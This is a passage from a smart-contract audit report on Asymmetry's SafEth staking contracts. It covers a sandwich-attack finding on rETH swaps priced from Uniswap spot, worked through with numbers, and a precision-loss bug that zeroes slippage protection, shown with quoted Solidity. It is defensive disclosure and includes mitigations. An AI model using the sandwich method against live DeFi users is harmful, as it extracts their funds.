href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/896\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/886\">0xTraub</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/882\">teddav</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/860\">n1punp</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/848\">shalaamum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/845\">auditor0517</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/840\">handsomegiraffe</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/809\">MadWookie</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/798\">0xfusion</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/797\">0xRobocop</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/764\">CodeFoxInc</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/756\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/750\">deliriusz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/722\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/714\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/697\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/612\">bearonbike</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/601\">Shogoki</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/575\">Bahurum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/558\">0x52</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/555\">Lirios</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/554\">IgorZuk</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/543\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/537\">0xl51</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/531\">BanPaleo</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/492\">wait</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/489\">019EC6E2</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/469\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/457\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/446\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/427\">SaeedAlipoor01988</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/381\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/380\">fs0c</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/360\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/310\">a3yip6</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/309\">Bauer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/295\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/294\">UdarTeam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/279\">top1st</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/265\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/251\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/243\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/224\">roelio</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/211\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/201\">igingu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/200\">Dug</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/180\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/128\">4lulz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/126\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/124\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/45\">ToonVH</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/43\">chalex</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/26\">SunSec</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/17\">latt1ce</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63-L101\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63-L101</a> <br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L228-L245\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L228-L245</a> <br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183</a> <br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L56-L66\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L56-L66</a> <br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L128\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L128</a> <br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74-L75\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74-L75</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>rETH derivative can be bought through uniswap if the deposit contract is not open.</p>\n<p>While a maxSlippage variable is set, the price of rETH on uniswap is the spot price and is only determined during the transaction opening sandwich opportunity for MEV researchers as long as the slippage stays below maxSlippage.</p>\n<p>This is also true for WstETH (on withdraw) and frxETH (on deposit and withdraw) that go through a curve pool when unstaking (and staking for frxETH). While the curve pool has much more liquidity and the assumed price is a 1 - 1 ratio for WstETH and frxETH seem to be using a twap price before applying the slippage, these attacks are less likely to happen so I will only describe rETH.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>While the current rETH derivative contract uses uniswapv3 0,05% pool, I’ll be using the uniswapv2 formula (<a href=\"https://amm-calculator.vercel.app/\">https://amm-calculator.vercel.app/</a>) to make this example simplier, in both case sandwiching is possible.</p>\n<p>Default slippage is set to 1% on rETH contract at deployment. (see: <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L44\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L44</a>)</p>\n<p>Let’s take a pool of 10,000 rETH for 10,695 eth (same ratio is on the univ3 0,05% pool on the 26th of march).</p>\n<p>User wants to stake 100ETH, a third of it will be staked through rETH according to a 1/3 weight for each derivative.</p>\n<p>Bundle:</p>\n<p>TX1:</p>\n<p>Researcher swap 100 ETH in for 92.63 rETH<br>\nnew pool balance: 9907.36 rETH - 10795 ETH</p>\n<p>TX2:</p>\n<p>User stake his ETH, the rocketPool deposit contract is close so the deposit function takes the current spot price of the pool and then applies 1% slippage to it to get minOut.</p>\n<p>Current ratio: eth = 0.9177 rETH<br>\nETH to swap for reth: 33.3333~<br>\nSo minOut -> 33.3333 * 0.9177 * 0.99 = 30.284 rETH</p>\n<p>(see: <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183</a>)</p>\n<p>Contract swap 33.3333 ETH for 30.498 rETH (slippage of 0.61% so below 1% and received more than minOut)</p>\n<p>New pool balance: 9876.86 rETH - 10828.33 ETH</p>\n<p>TX3:</p>\n<p>Researcher swap back the 92.63 rETH in for 100.61~ ETH<br>\nnew pool balance: 9969.49 rETH - 10727.72 ETH</p>\n<p>Researcher made 0.61~ ETH of profit, could be more as we only applied a 0,61% slippage but we can go as far as 1% in the current rETH contract.</p>\n<p>Univ3 pool would could even worse as Researcher with a lot of liquidity could be able to drain one side (liquidity is very concentrated), add liquidity in a tight range execute the stake and then remove liquidity and swap back.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The rETH price should be determined using the TWAP price and users should be able to input minOut in the stake, unstake and rebalanceToWeight function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/142#issuecomment-1518578752\">Picodes (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Using Chainlink to get price instead of poolPrice.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/35\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/29\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/12\">0x52</a>.</p>\n<hr>\n<h1 id=\"medium-risk-findings-12\" style=\"position:relative;\"><a href=\"#medium-risk-findings-12\" aria-label=\"medium risk findings 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (12)</h1>\n<h2 id=\"m-01-division-before-multiplication-truncate-minout-and-incurs-heavy-precision-loss-and-result-in-insufficient-slippage-protection\" style=\"position:relative;\"><a href=\"#m-01-division-before-multiplication-truncate-minout-and-incurs-heavy-precision-loss-and-result-in-insufficient-slippage-protection\" aria-label=\"m 01 division before multiplication truncate minout and incurs heavy precision loss and result in insufficient slippage protection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078\">[M-01] Division before multiplication truncate <code>minOut</code> and incurs heavy precision loss and result in insufficient slippage protection</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1044\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1028\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/692\">neumo</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/607\">Bauer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/525\">0xkazim</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/510\">UniversalCrypto</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/473\">Matin</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/470\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/340\">J4de</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/187\">cryptothemex</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/23\">latt1ce</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/20\">0xnev</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/11\">koxuan</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L173\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L173</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74</a></p>\n<p>When Calcuting the minOut before doing trade, division before multiplication truncate minOut and incurs heavy precision loss, then very sub-optimal amount of the trade output can result in loss of fund from user because of the insufficient slippage protection.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the current implementation, slippage can be set by calling</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L206\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L206</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">\t</span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - Sets the max slippage for a certain derivative index</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">\t</span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk3\"> - index of the derivative you want to update the slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">\t</span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk3\"> - new slippage amount in wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">].</span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SetMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Which calls the corresponding derivative contract.</p>\n<p><strong>Case 1</strong></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L58\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L58</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">\t</span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - Owner only function to set max slippage for derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">\t</span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk3\"> - new slippage amount in wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L173\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L173</a></p>\n<p>calling</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = ((((</span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t((</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">))) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IWETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountSwapped</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">swapExactInputSingleHop</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">500</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>As we can see, the division before multiplication happens in the line of code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = ((((</span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t((</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">))) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>For example, if maxSlippage is 10 ** 17</p>\n<p>(10 ** 18 - 10 ** 17) / (10 ** 18) = 0</p>\n<p>Then minOut is 0, slippage control is disabled because of the division before multipcation.</p>\n<p><strong>Case 2</strong></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L51\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L51</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">\t</span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - Owner only function to set max slippage for derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span 